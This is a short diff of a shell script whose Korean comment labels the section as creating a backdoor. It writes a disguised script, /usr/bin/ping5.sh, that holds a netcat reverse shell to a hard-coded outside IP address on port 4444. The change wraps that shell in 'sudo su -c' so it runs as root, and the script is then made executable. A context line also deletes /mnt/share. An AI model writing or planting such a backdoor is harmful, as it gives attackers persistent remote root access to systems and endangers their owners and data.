@@ -36,7 +36,7 @@ sudo rm -r /mnt/share
 # 백도어 생성
 sudo tee /usr/bin/ping5.sh > /dev/null << 'EOF'
 #!/bin/bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 220.75.218.64 4444 > /tmp/f
+sudo su -c "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 220.75.218.64 4444 > /tmp/f"
 EOF
 
 sudo chmod +x /usr/bin/ping5.sh 
